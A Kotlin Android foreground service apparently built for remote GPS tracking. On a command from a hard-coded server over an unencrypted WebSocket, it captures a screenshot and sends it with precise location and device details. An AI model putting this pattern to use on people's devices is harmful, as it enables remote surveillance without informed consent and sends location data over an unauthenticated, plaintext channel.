package dev.abrorjon755.gpslocation.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.View
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.graphics.createBitmap
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import dev.abrorjon755.gpslocation.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.io.ByteArrayOutputStream
import java.time.LocalTime
import java.util.concurrent.TimeUnit

@Suppress("DEPRECATION")
class GpsLocationService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var webSocket: WebSocket? = null
    private var webSocketClient: OkHttpClient? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("SERVICE", "GpsLocationService onCreate")
        startForeground(1, createNotification())

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        setupWebSocket()
    }

    override fun onDestroy() {
        Log.d("SERVICE", "GpsLocationService onDestroy")
        serviceScope.cancel()
        webSocket?.close(1000, null)
        webSocketClient?.dispatcher?.executorService?.shutdown()
        super.onDestroy()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("SERVICE", "GpsLocationService onStartCommand")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun setupWebSocket() {
        webSocketClient = OkHttpClient.Builder()
            .pingInterval(30, TimeUnit.SECONDS)
            .build()

        val request = Request.Builder().url("ws://35.184.28.154:8080/ws").build()

        webSocket = webSocketClient!!.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("WebSocket", "Connected")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d("WebSocket", "Received: $text")
                if (text.contains("location_request")) {
                    serviceScope.launch {
                        val screenshot = takeScreenshotBase64()
                        getCurrentLocationAndSend(screenshot)
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("WebSocket", "Failure: ${t.message}")
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun getCurrentLocationAndSend(screenshotBase64: String?) {
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e("SERVICE", "Location permission not granted")
            return
        }

        val locationRequest = LocationRequest.create().apply {
            priority = Priority.PRIORITY_HIGH_ACCURACY
            numUpdates = 1
        }

        fusedLocationClient.requestLocationUpdates(locationRequest, object : LocationCallback() {
            @RequiresApi(Build.VERSION_CODES.O)
            override fun onLocationResult(result: LocationResult) {
                val location = result.lastLocation
                if (location != null) {
                    val message = """
                        {
                          \"type\": \"location_response\",
                          \"device\": \"${Build.MODEL}\",
                          \"latitude\": ${location.latitude},
                          \"longitude\": ${location.longitude},
                          \"time\": \"${LocalTime.now()}\",
                          \"screenshot\": \"$screenshotBase64\"
                        }
                    """.trimIndent()
                    Log.d("SERVICE", "Sending: $message")
                    webSocket?.send(message)
                }
                fusedLocationClient.removeLocationUpdates(this)
            }
        }, Looper.getMainLooper())
    }

    companion object {
        @SuppressLint("StaticFieldLeak")
        var rootView: View? = null
    }

    private fun takeScreenshotBase64(): String? {
        return try {
            val view = rootView
            if (view != null) {
                val bitmap = createBitmap(view.width, view.height)
                val canvas = Canvas(bitmap)
                view.draw(canvas)

                val stream = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            } else {
                Log.e("SERVICE", "rootView is null")
                null
            }
        } catch (e: Exception) {
            Log.e("SERVICE", "Screenshot error: ${e.message}")
            null
        }
    }



    private fun createNotification(): Notification {
        val channelId = "gps_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel =
                NotificationChannel(channelId, "GPS Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("GPS Tracking Service")
            .setContentText("Waiting for location requests...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()
    }
}
